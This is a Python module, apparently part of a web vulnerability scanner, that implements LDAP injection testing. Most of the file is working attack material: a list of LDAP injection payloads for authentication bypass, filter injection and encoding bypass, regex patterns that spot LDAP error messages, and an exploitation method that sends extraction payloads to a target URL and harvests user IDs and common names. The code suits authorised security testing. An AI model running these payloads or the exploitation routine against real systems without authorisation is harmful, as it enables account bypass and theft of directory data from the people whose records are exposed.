"""
LDAP Injection Context Implementation

Detects and exploits LDAP injection vulnerabilities in LDAP queries.
"""

import re
from typing import List, Dict, Any, Tuple, Optional
from .base import InjectionContext, InjectionContextType


class LDAPInjectionContext(InjectionContext):
    """
    LDAP injection attack context.
    Detects and exploits LDAP injection vulnerabilities.
    """
    
    def get_context_type(self) -> InjectionContextType:
        return InjectionContextType.LDAP
    
    def _load_payloads(self) -> List[str]:
        """Load LDAP injection payloads."""
        return [
            # Basic LDAP injection
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin)(&)",
            "admin)(|(password=*))",
            
            # OR-based injection
            "*)|",
            "*)|(cn=*",
            "*)|(mail=*",
            "*)|(uid=*",
            
            # AND-based injection
            "*)(&(uid=*",
            "*)(&(cn=*",
            
            # Blind LDAP injection
            "*)(objectClass=*",
            "*)(|(objectClass=*",
            
            # Filter injection
            "(&(uid=*)",
            "(|(uid=*)(cn=*))",
            "(&(objectClass=person)(uid=*))",
            
            # Authentication bypass
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin*",
            "*admin",
            
            # Attribute injection
            "*)(&(userPassword=*",
            "*))%00",
            "*()|%26",
            
            # NULL byte injection
            "*%00",
            "admin%00",
            "*)(cn=%00",
            
            # Unicode/encoding bypass
            "*%2A",
            "%2A)(uid=%2A",
            "*%u002A",
            
            # Complex filters
            "(&(objectClass=*)(uid=*))",
            "(|(objectClass=user)(objectClass=person))",
            "(&(!(objectClass=computer))(uid=*))",
        ]
    
    def _load_detection_patterns(self) -> List[Dict[str, Any]]:
        """Load LDAP error patterns for detection."""
        return [
            # LDAP error messages
            {'pattern': r'LDAP.*error', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'javax\.naming\.directory', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'LDAPException', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'com\.sun\.jndi\.ldap', 'type': 'error', 'confidence': 0.90},
            
            # LDAP syntax errors
            {'pattern': r'Invalid.*LDAP.*filter', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'Bad search filter', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'LDAP.*syntax.*error', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'Filter.*invalid', 'type': 'error', 'confidence': 0.85},
            
            # LDAP server errors
            {'pattern': r'LDAP: error code \d+', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'ldap_search.*failed', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'Unable to.*LDAP', 'type': 'error', 'confidence': 0.85},
            
            # Active Directory errors
            {'pattern': r'Active Directory.*error', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'DirectorySearcher', 'type': 'error', 'confidence': 0.85},
            
            # OpenLDAP errors
            {'pattern': r'OpenLDAP', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'ldap_bind', 'type': 'error', 'confidence': 0.85},
            
            # Generic directory errors
            {'pattern': r'Directory.*exception', 'type': 'error', 'confidence': 0.80},
            {'pattern': r'NamingException', 'type': 'error', 'confidence': 0.85},
        ]
    
    def analyze_response(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_time: Optional[float] = None
    ) -> Tuple[bool, float, str]:
        """
        Analyze response for LDAP injection indicators.
        """
        # Check for error-based detection
        for pattern_info in self.detection_patterns:
            pattern = pattern_info['pattern']
            if re.search(pattern, response_body, re.IGNORECASE):
                evidence = f"LDAP error pattern detected: {pattern}"
                return True, pattern_info['confidence'], evidence
        
        # Check for authentication bypass indicators
        if self._check_auth_bypass(response_body):
            evidence = "LDAP authentication bypass indicators detected"
            return True, 0.80, evidence
        
        # Check for data exfiltration indicators
        if self._check_data_exfiltration(response_body):
            evidence = "LDAP data exfiltration indicators detected"
            return True, 0.75, evidence
        
        return False, 0.0, "No LDAP injection detected"
    
    def _check_auth_bypass(self, response_body: str) -> bool:
        """Check for authentication bypass indicators."""
        indicators = [
            r'welcome',
            r'logged.*in',
            r'authentication.*successful',
            r'dashboard',
            r'admin.*panel',
        ]
        
        for indicator in indicators:
            if re.search(indicator, response_body, re.IGNORECASE):
                return True
        
        return False
    
    def _check_data_exfiltration(self, response_body: str) -> bool:
        """Check for data exfiltration indicators."""
        # Look for LDAP attributes in response
        ldap_attributes = [
            r'cn=',
            r'uid=',
            r'mail=',
            r'userPassword',
            r'objectClass=',
            r'distinguishedName',
            r'memberOf',
        ]
        
        match_count = 0
        for attr in ldap_attributes:
            if re.search(attr, response_body, re.IGNORECASE):
                match_count += 1
        
        # If multiple LDAP attributes appear, likely successful injection
        return match_count >= 2
    
    def attempt_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        successful_payload: str
    ) -> Optional[Dict[str, Any]]:
        """
        Attempt to exploit LDAP injection to extract data.
        """
        import requests
        
        exploitation_results = {
            'users_found': [],
            'attributes_extracted': [],
            'authentication_bypassed': False,
        }
        
        # Try to extract user information
        user_extraction_payloads = [
            "*)(&(objectClass=user)(uid=*",
            "*)(&(objectClass=person)(cn=*",
            "*)(uid=*)(mail=*",
        ]
        
        for payload in user_extraction_payloads:
            try:
                if parameter_type.upper() == "GET":
                    response = requests.get(
                        target_url,
                        params={vulnerable_parameter: payload},
                        timeout=10
                    )
                else:
                    response = requests.post(
                        target_url,
                        data={vulnerable_parameter: payload},
                        timeout=10
                    )
                
                # Extract LDAP attributes from response
                ldap_user_pattern = r'uid=([a-zA-Z0-9_-]+)'
                users = re.findall(ldap_user_pattern, response.text)
                if users:
                    exploitation_results['users_found'].extend(users)
                
                ldap_cn_pattern = r'cn=([^,\)]+)'
                cns = re.findall(ldap_cn_pattern, response.text)
                if cns:
                    exploitation_results['attributes_extracted'].extend(cns)
                
            except requests.RequestException:
                continue
        
        # Remove duplicates
        exploitation_results['users_found'] = list(set(exploitation_results['users_found']))
        exploitation_results['attributes_extracted'] = list(set(exploitation_results['attributes_extracted']))
        
        # Check if authentication was bypassed
        if self._check_auth_bypass(response.text):
            exploitation_results['authentication_bypassed'] = True
        
        return exploitation_results if any(exploitation_results.values()) else None
    
    def get_description(self) -> str:
        return "LDAP Injection - Tests for vulnerabilities in LDAP directory queries"
